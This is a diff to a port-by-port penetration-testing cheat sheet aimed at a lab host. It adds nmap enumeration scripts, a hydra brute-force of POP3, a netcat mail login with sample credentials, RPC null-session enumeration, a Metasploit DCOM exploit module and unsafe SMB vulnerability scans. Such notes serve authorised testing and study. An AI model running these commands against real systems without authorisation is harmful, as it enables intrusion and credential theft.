@@ -74,10 +74,24 @@ sslscan 192.168.200.5:443
 
 # 88 Kerberos
 Needed for AS-REP Roasting (and usernames) - See mxad
+nmap -Pn -sV -p 88,464 --script="banner,krb5-enum-users" 192.168.200.5
 
-# 111 RPC
+# 110 POP3
+nmap -Pn -sV -p $port "--script=banner,(pop3* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" 192.168.200.5
+hydra -l bob -P /usr/share/wordlistsnmap.lst -f 192.168.200.5 pop3 -V
+nc -nv 192.168.200.5 110
+USER bob
+PASS paxx
+list
+retr 1
+
+# 111/135 RPC
+nmap -p 111,135 -Pn -sV --script=banner,msrpc-enum,rpc-grind,rpcinfo 192.168.200.5  
 rpcbind -p 192.168.200.5
-nmap -p 111 --script rpcinfo.nse 192.168.200.5
+msf > use exploit/windows/dcerpc/ms03_026_dcom
+rpcclient 192.168.200.5 -U ''
+srvinfo
+enumdomusers
 
 # 111/2049 NFS/mountd
 nmap -sV -v --script=nfs-showmount 192.168.200.5
@@ -90,18 +104,18 @@ cd secrets; grep -irl password
 # 113 IDENT
 grep -i auth-owner ./nmap-fulltcp
 grep ^[0-9] ./nmap-ports | cut -d '/' -f 1 | tr '\n' ' ' 
-ident-user-enum 192.168.200.5 22 113 8080 10000 
+ident-user-enum 192.168.200.5 22 80 113 8080 10000 
 
-# 135 RPC
-nmap -p 135 192.168.200.5 --script=msrpc-enum
-msf > use exploit/windows/dcerpc/ms03_026_dcom
-rpcclient 192.168.200.5 -U ''
-srvinfo
-enumdomusers
+#123 NTP (UDP)
+sudo nmap -sU -p 123 --script ntp-info 192.168.200.5
+
+# 143/993 IMAP
+nmap -Pn -sV -p $port "--script=banner,(imap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" 192.168.200.5
 
 # 139/445 SMB
 nmblookup -A 192.168.200.5
 enum4linux -A 192.168.200.5
+sudo ./smbver.sh 192.168.200.5 139
 sudo nmap -p 139,445 -v --script=smb-vuln* 192.168.200.5 
 sudo nmap -p 445 -v --script=smb-enum-shares,smb-enum-users 192.168.200.5 
 sudo nmap -v --script=smb2-capabilities,smb-print-text,smb2-security-mode.nse,smb-protocols,smb2-time.nse,smb-psexec,smb2-vuln-uptime,smb-security-mode,smb-server-stats,smb-double-pulsar-backdoor,smb-system-info,smb-vuln-conficker,smb-enum-groups,smb-vuln-cve2009-3103,smb-enum-processes,smb-vuln-cve-2017-7494,smb-vuln-ms06-025,smb-enum-shares,smb-vuln-ms07-029,smb-enum-users,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-ls,smb-vuln-ms10-061,smb-vuln-ms17-010,smb-os-discovery --script-args=unsafe=1 -T5 192.168.200.5 -oG nmap-smb
@@ -113,7 +127,7 @@ smbclient --list //192.168.200.5/ -U "guest"
 smbclient //192.168.200.5/share -N
 smbclient \\\\192.168.200.5\\share -U bob
 
-# 161/162 UDP - SNMP
+# 161/162 SNMP (UDP)
 snmp-check -t 192.168.200.5 -c public
 sudo nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 192.168.200.5
 echo -e "public\nprivate\nmanager\ncommunity" > community.txt 
